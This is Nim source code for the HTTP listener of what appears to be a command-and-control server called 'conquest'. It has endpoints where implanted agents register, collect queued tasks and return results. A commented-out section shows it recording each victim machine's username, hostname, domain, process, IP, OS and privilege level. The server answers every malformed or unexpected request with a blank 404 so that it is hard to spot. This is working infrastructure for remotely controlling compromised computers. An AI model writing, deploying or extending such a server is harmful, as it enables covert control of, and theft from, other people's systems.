import prologue, json, terminal, strformat
import sequtils, strutils, times, base64

import ./handlers
import ../[utils, globals]
import ../../common/[types, utils]

proc error404*(ctx: Context) {.async.} = 
    resp "", Http404

#[
    POST /register
    Called from agent to register itself to the conquest server
]# 
proc register*(ctx: Context) {.async.} = 

    # Check headers
    # If POST data is not binary data, return 404 error code
    if ctx.request.contentType != "application/octet-stream": 
        resp "", Http404
        return

    try: 
        let agentId = register(ctx.request.body.toBytes())
        resp "Ok", Http200

    except CatchableError:
        resp "", Http404

    # try: 
    #     let 
    #         postData: JsonNode = parseJson(ctx.request.body)
    #         agentRegistrationData: AgentRegistrationData = postData.to(AgentRegistrationData)
    #         agentUuid: string = generateUUID()
    #         listenerUuid: string = ctx.getPathParams("listener")
    #         date: DateTime = now()

    #     let agent: Agent = Agent(
    #         name: agentUuid, 
    #         listener: listenerUuid,
    #         username: agentRegistrationData.username,
    #         hostname: agentRegistrationData.hostname,
    #         domain: agentRegistrationData.domain,
    #         process: agentRegistrationData.process,
    #         pid: agentRegistrationData.pid,
    #         ip: agentRegistrationData.ip,
    #         os: agentRegistrationData.os,
    #         elevated: agentRegistrationData.elevated, 
    #         sleep: agentRegistrationData.sleep,
    #         jitter: 0.2,
    #         tasks: @[],
    #         firstCheckin: date,
    #         latestCheckin: date
    #     )

    #     # Fully register agent and add it to database
    #     if not agent.register(): 
    #         # Either the listener the agent tries to connect to does not exist in the database, or the insertion of the agent failed
    #         # Return a 404 error code either way
    #         resp "", Http404
    #         return 

    #     # If registration is successful, the agent receives it's UUID, which is then used to poll for tasks and post results
    #     resp agent.name

    # except CatchableError:
    #     # JSON data is invalid or does not match the expected format (described above)
    #     resp "", Http404

    # return

#[
    GET /{listener-uuid}/{agent-uuid}/tasks
    Called from agent to check for new tasks
]#
proc getTasks*(ctx: Context) {.async.} = 
    
    let 
        listener = ctx.getPathParams("listener")
        agent = ctx.getPathParams("agent")
        
    try: 
        var response: seq[byte]
        let tasks: seq[seq[byte]] = getTasks(listener, agent)

        if tasks.len <= 0: 
            resp "", Http200
            return

        # Create response, containing number of tasks, as well as length and content of each task
        # This makes it easier for the agent to parse the tasks
        response.add(uint8(tasks.len))

        for task in tasks:
            response.add(uint32(task.len).toBytes()) 
            response.add(task)
        
        await ctx.respond(
            code = Http200,
            body = response.toString()
        )

        # Notify operator that agent collected tasks
        {.cast(gcsafe).}:
            let date = now().format("dd-MM-yyyy HH:mm:ss")
            cq.writeLine(fgBlack, styleBright, fmt"[{date}] [*] ", resetStyle, fmt"{$response.len} bytes sent.")

    except CatchableError:
        resp "", Http404

#[
    POST /results
    Called from agent to post results of a task
]#
proc postResults*(ctx: Context) {.async.} = 
    
    # Check headers
    # If POST data is not binary data, return 404 error code
    if ctx.request.contentType != "application/octet-stream": 
        resp "", Http404
        return

    try: 
        handleResult(ctx.request.body.toBytes())

    except CatchableError:
        resp "", Http404

    return